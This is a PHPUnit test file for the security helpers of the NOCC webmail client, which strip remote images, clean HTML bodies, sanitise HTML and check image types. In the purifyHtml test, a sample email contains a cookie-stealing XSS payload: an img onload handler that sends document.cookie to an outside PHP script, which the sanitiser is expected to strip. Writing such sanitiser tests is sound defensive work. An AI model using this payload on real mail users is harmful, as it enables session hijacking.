<?php
/**
 * Test cases for NOCC_Security.
 *
 * Copyright 2009-2011 Tim Gerundt <tim@gerundt.de>
 *
 * This file is part of NOCC. NOCC is free software under the terms of the
 * GNU General Public License. You should have received a copy of the license
 * along with NOCC.  If not, see <http://www.gnu.org/licenses/>.
 *
 * @package    NOCC
 * @subpackage Tests
 * @license    http://www.gnu.org/licenses/ GNU General Public License
 * @version    SVN: $Id: NOCC_SecurityTest.php 2551 2012-05-28 13:00:55Z gerundt $
 */

require_once 'PHPUnit/Framework.php';

require_once dirname(__FILE__).'/../../classes/nocc_security.php';

/**
 * Test class for NOCC_Security.
 */
class NOCC_SecurityTest extends PHPUnit_Framework_TestCase {
    /**
     * Test case for disableHtmlImages().
     */
    public function testDisableHtmlImages() {
        $html =
'<dl>
  <dt>normal image with double quote<dt>
  <dd><img src="http://nocc.sourceforge.net/engine/images/logo.png" /></dd>
  <dt>normal image with single quote<dt>
  <dd><img src=\'http://nocc.sourceforge.net/engine/images/logo.png\' /></dd>
  <dt>normal image without quote<dt>
  <dd><img Src=http://nocc.sourceforge.net/engine/images/logo.png /></dd>
  <dt>normal image with whitespace and double quote<dt>
  <dd><img src = "http://nocc.sourceforge.net/engine/images/logo.png " /></dd>
  <dt>normal image with whitespace and single quote<dt>
  <dd><img src = \'http://nocc.sourceforge.net/engine/images/logo.png \' /></dd>
  <dt>normal image with whitespace and without quote<dt>
  <dd><img srC = http://nocc.sourceforge.net/engine/images/logo.png /></dd>
</dl>

<table>
  <tr>
    <td background="http://nocc.sourceforge.net/engine/images/logo.png">background with double quote</td>
  </tr>
  <tr>
    <td background=\'http://nocc.sourceforge.net/engine/images/logo.png\'>background with single quote</td>
  </tr>
  <tr>
    <td BackGround=http://nocc.sourceforge.net/engine/images/logo.png>background without quote</td>
  </tr>
  <tr>
    <td background = "http://nocc.sourceforge.net/engine/images/logo.png ">background with whitespace and double quote</td>
  </tr>
  <tr>
    <td background = \'http://nocc.sourceforge.net/engine/images/logo.png \'>background with whitespace and single quote</td>
  </tr>
  <tr>
    <td background = http://nocc.sourceforge.net/engine/images/logo.png >background with whitespace and without quote</td>
  </tr>
</table>

<p style="BackGround:Url(http://nocc.sourceforge.net/engine/images/logo.png)">background-style</p>
<p style="background:url(\'http://nocc.sourceforge.net/engine/images/logo.png\')">background-style with single quote</p>
<p style=" background : url( http://nocc.sourceforge.net/engine/images/logo.png ) ">background-style with whitespace</p>
<p style="background : url( \'http://nocc.sourceforge.net/engine/images/logo.png \')">background-style with whitespace and single quote</p>';

        $expected =
'<dl>
  <dt>normal image with double quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image with single quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image without quote<dt>
  <dd><img src="none"/></dd>
  <dt>normal image with whitespace and double quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image with whitespace and single quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image with whitespace and without quote<dt>
  <dd><img src="none"/></dd>
</dl>

<table>
  <tr>
    <td background="none">background with double quote</td>
  </tr>
  <tr>
    <td background="none">background with single quote</td>
  </tr>
  <tr>
    <td background="none">background without quote</td>
  </tr>
  <tr>
    <td background="none">background with whitespace and double quote</td>
  </tr>
  <tr>
    <td background="none">background with whitespace and single quote</td>
  </tr>
  <tr>
    <td background="none">background with whitespace and without quote</td>
  </tr>
</table>

<p style="BackGround:url(none)">background-style</p>
<p style="background:url(none)">background-style with single quote</p>
<p style=" background : url(none) ">background-style with whitespace</p>
<p style="background : url(none)">background-style with whitespace and single quote</p>';

        $this->assertEquals($expected, NOCC_Security::disableHtmlImages($html));
    }

    /**
     * Test case for hasDisabledHtmlImages().
     */
    public function testHasDisabledHtmlImages() {
        $this->assertFalse(NOCC_Security::hasDisabledHtmlImages(''));

        $this->assertTrue(NOCC_Security::hasDisabledHtmlImages('<dd><img src="none"/></dd>'), 'src="none"');
        $this->assertTrue(NOCC_Security::hasDisabledHtmlImages('<td background="none">...</td>'), 'background="none"');
        $this->assertTrue(NOCC_Security::hasDisabledHtmlImages('<p style="background:url(none)">...</p>'), 'background:url(none)');
        $this->assertTrue(NOCC_Security::hasDisabledHtmlImages('<p style="background : url(none)">...</p>'), 'background : url(none)');
    }

    /**
     * Test case for cleanHtmlBody().
     */
    public function testCleanHtmlBody() {
        $html1 =
'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
  <head>
    <title>Test</TITLE>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="Just a test!" />
    <link href="stylesheet.css" rel="stylesheet" type="text/css" />
    <LINK href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <script src="javascript.js" type="text/javascript"></script>
    <style><!-- Test -->
      h1 {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 10pt;
      }
    </style>
  </HEAD>
<BODY>
<h1>Test</h1>
<p>This is just a test!</p>
</body>
</HTML>';

        $html2 =
'<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
    <title>Test</TITLE
    >
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="Just a test!" /
>
    <link href="stylesheet.css" rel="stylesheet" type="text/css" />
    <LINK href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <script src="javascript.js" type="text/javascript"></script>
  <style><!-- Test -->
    h1 {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 10pt;
    }
  </style>
  </HEAD>
<BODY dir="ltr">
<h1>Test</h1>
<p>This is just a test!</p>
</body>
</HTML>';

        $expected =
'<h1>Test</h1>
<p>This is just a test!</p>';

        $this->assertEquals($expected, NOCC_Security::cleanHtmlBody($html1));
        $this->assertEquals($expected, NOCC_Security::cleanHtmlBody($html2));
    }

    /**
     * Test case for purifyHtml().
     */
    public function testPurifyHtml() {
        $html =
'Nun klaue ich Dir Dein Session Cookie!<br />&nbsp;<br />
<img alt="test" src="cid:part1.07060002.08090408@hitco.at"
  height="20" width="20"
  onload="document.myIMG.src=\'http\'+\':\'+\'//\'+\'www.hitco.at/img/cookieklau.php?\'+document.cookie" />
<img name="myIMG" src="cid:part1.07060002.08090408@hitco.at" height="20" width="800" /><br />';

        $expected =
'Nun klaue ich Dir Dein Session Cookie!<br />&nbsp;<br />
<img alt="test" src="cid:part1.07060002.08090408@hitco.at" height="20" width="20" />
<img src="cid:part1.07060002.08090408@hitco.at" height="20" width="800" alt="image" id="myIMG" /><br />';

        $this->assertEquals($expected, NOCC_Security::purifyHtml($html));
    }

    /**
     * Test case for convertHtmlToPlainText().
     */
    public function testConvertHtmlToPlainText() {
        $html1 =
"<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'>This is just a &#8211; small test!</span></font></p>";

        $expected1 =
'This is just a – small test!';
        
        $html2 =
"<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'>Line 1</span></font></p>
 
<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'></span></font></p>
 
<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'></span></font></p>
 
<div>
 
<p class=MsoNormal><strong><b><font size=2 color=navy face=Arial><span
style='font-size:10.0pt;font-family:Arial;color:navy'>Line 2</span></font></b>
</strong><font color=navy><span style='color:navy'></span></font></p>
 
<div>
 
<p class=MsoNormal><font size=3 color=navy face=\"Times New Roman\"><span
style='font-size:12.0pt;color:navy'>&nbsp;</span></font></p>
 
</div>";

        $expected2 =
'Line 1
 

 

 

 
Line 2

 

 
 
 
';

        $this->assertEquals($expected1, NOCC_Security::convertHtmlToPlainText($html1));
        $this->assertEquals($expected2, NOCC_Security::convertHtmlToPlainText($html2));
    }

    /**
     * Test case for isSupportedImageType().
     */
    public function testIsSupportedImageType() {
        $this->assertFalse(NOCC_Security::isSupportedImageType(null), 'NULL');
        $this->assertFalse(NOCC_Security::isSupportedImageType('image'), 'image');
        $this->assertFalse(NOCC_Security::isSupportedImageType('image\bug'), 'image\bug');
        $this->assertFalse(NOCC_Security::isSupportedImageType('text/plain'), 'text/plain');

        $this->assertFalse(NOCC_Security::isSupportedImageType('image/exe'), 'image/exe');
        $this->assertFalse(NOCC_Security::isSupportedImageType('image/tiff'), 'image/tiff');
        $this->assertFalse(NOCC_Security::isSupportedImageType('image/Gift'), 'image/Gift');

        $this->assertTrue(NOCC_Security::isSupportedImageType('image/jpeg'), 'image/jpeg');
        $this->assertTrue(NOCC_Security::isSupportedImageType('image/PJPEG'), 'image/PJPEG');
        $this->assertTrue(NOCC_Security::isSupportedImageType('IMAGE/Gif'), 'IMAGE/Gif');
        $this->assertTrue(NOCC_Security::isSupportedImageType('Image/pnG'), 'Image/pnG');
    }
}
?>
